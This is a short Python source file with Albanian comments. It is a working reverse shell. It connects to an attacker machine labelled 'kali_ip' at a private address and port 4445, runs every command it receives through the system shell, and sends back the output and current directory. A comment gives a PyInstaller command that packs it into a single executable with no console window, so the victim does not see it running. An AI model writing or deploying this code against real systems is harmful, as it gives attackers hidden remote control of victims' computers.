import socket
import subprocess
import os  # Nevojitet për të marrë direktorinë aktuale        python -m PyInstaller --onefile --noconsole pythacces.py

kali_ip = "10.54.6.62"
kali_port = 4445

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((kali_ip, kali_port))

while True:
    command = s.recv(1024).decode("utf-8")
    if command.lower() == "exit":
        break

    try:
        # Ndrysho direktorinë nëse komanda është cd
        if command.startswith("cd "):
            os.chdir(command[3:].strip())
            result = ""
        else:
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr
    except Exception as e:
        result = str(e)

    # Merr direktorinë aktuale
    current_dir = os.getcwd()
    message = result + "\n" + f"{current_dir}> "
    s.send(message.encode("utf-8"))
